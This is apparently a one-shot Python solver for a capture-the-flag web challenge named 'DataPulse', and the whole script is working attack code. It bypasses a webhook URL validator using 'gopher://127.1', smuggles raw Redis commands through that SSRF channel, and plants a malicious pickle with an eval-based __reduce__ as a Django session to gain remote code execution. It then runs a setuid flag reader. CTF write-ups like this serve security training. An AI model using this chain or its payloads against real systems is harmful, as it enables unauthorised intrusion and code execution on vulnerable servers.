#!/usr/bin/env python3
"""12064 · DataPulse (WEB/HARD) — one-shot solver.

Chain
  1. register -> session cookie + task (needed as the SSRF channel)
  2. POST /tasks/<id>/retry-webhook/ {"url": "gopher://127.1:6379/_<RESP>"}
     -> the webhook fetcher supports gopher; the URL validator only does an exact
        host match against {127.0.0.1, localhost, 0.0.0.0} + an http/https/gopher
        scheme allowlist, so 127.1 gets us to the container's Redis.
  3. Redis db1 holds server-side sessions as RAW PICKLES under
        ":1:django.contrib.sessions.cache<sid>"
     A pickle whose __reduce__ is (eval, (code,)) executes when the app loads the
     session -> RCE as uid 1000(ctf).
  4. /flag.txt is root-only, but /readflag is setuid root -> run it.

Usage:
    python3 12064-solve.py http://<proxy-ip>:<port>
"""
import base64
import random
import string
import sys
import time
import pickle

import requests

SID_LEN = 32


def resp(*args) -> bytes:
    """RESP array, as a raw byte string for gopher."""
    out = b'*%d\r\n' % len(args)
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        out += b'$%d\r\n%s\r\n' % (len(a), a)
    return out


class RCE:
    """Pickle payload: runs `code` through eval() when unpickled."""

    def __init__(self, code):
        self.code = code

    def __reduce__(self):
        return (eval, (self.code,))


class Solver:
    def __init__(self, base):
        self.base = base.rstrip('/')
        self.s = requests.Session()
        self.task_id = None

    # ---------- app plumbing ----------
    def login(self, user=None, pw='Passw0rd!2026'):
        user = user or 'x' + ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
        r = self.s.post(self.base + '/register/',
                        json={'username': user, 'password': pw, 'email': user + '@x.y'}, timeout=15)
        if r.status_code != 200:
            r = self.s.post(self.base + '/login/', json={'username': user, 'password': pw}, timeout=15)
        r.raise_for_status()
        return user

    def make_task(self):
        r = self.s.post(self.base + '/tasks/create/',
                        json={'name': 'solve', 'type': 'statistics',
                              'parameters': {'data': '1'},
                              'webhook_url': 'http://127.1:8000/'}, timeout=15)
        r.raise_for_status()
        self.task_id = r.json()['task_id']

    def gopher(self, payload: bytes) -> str:
        """Send raw bytes to 127.0.0.1:6379 and return the echoed redis reply."""
        import urllib.parse
        url = 'gopher://127.1:6379/_' + urllib.parse.quote_from_bytes(payload, safe='')
        for _ in range(3):
            try:
                d = self.s.post(f'{self.base}/tasks/{self.task_id}/retry-webhook/',
                                json={'url': url}, timeout=30).json()
                return (d.get('log') or {}).get('response_body') or ''
            except Exception:
                time.sleep(1.5)
        raise RuntimeError('gopher channel failed (session/task expired?)')

    def redis(self, *args) -> str:
        return self.gopher(resp(*args))

    # ---------- exploit ----------
    def poison_session(self, code: str) -> str:
        """Write a malicious pickle into a fresh sid and trigger the unpickle."""
        sid = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(SID_LEN))
        key = b':1:django.contrib.sessions.cache' + sid.encode()
        val = pickle.dumps(RCE(code), protocol=4)
        self.gopher(b'SELECT 1\r\n' + resp('SET', key, val))
        # any request that loads the session triggers the payload
        s2 = requests.Session()
        s2.cookies.set('dp_session', sid, domain=self.base.split('//')[1].split(':')[0], path='/')
        try:
            s2.get(self.base + '/api/v1/profile/', timeout=15)
        except Exception:
            pass
        return sid

    def run(self, out_key='flag01'):
        self.login()
        self.make_task()
        assert '+PONG' in self.redis('PING'), 'redis not reachable over gopher'
        code = ("(lambda r: r.set('%s', __import__('subprocess')"
                ".check_output('/readflag', shell=True).decode()))"
                "(__import__('redis').Redis())" % out_key)
        self.poison_session(code)
        time.sleep(2)
        raw = self.redis('GET', out_key)
        # RESP bulk string -> payload text
        if raw.startswith('$'):
            body = raw.split('\r\n', 1)[1] if '\r\n' in raw else ''
            return body.strip()
        return raw.strip()


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else 'http://<target>:28731'
    flag = Solver(base).run()
    print('FLAG:', flag)
    assert flag.startswith('DASCTF{') and flag.endswith('}'), 'unexpected output: %r' % flag
    print('submit content:', flag[flag.index('{') + 1:-1])


if __name__ == '__main__':
    main()
